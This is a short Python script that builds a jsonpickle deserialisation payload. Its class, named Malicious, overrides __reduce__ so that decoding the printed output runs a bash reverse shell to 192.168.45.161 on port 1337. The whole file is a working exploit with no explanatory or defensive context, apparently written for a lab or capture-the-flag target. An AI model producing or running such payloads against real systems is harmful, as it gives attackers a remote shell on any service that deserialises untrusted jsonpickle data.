import jsonpickle

class Malicious:
    def __reduce__(self):
        from subprocess import Popen
        # Equivalent to:
        # bash -c "bash -i >& /dev/tcp/192.168.45.161/1337 0>&1"
        return Popen, (("bash", "-c", "bash -i >& /dev/tcp/192.168.45.161/1337 0>&1"),)

exploit = Malicious()
serialised = jsonpickle.encode(exploit)
print(serialised)
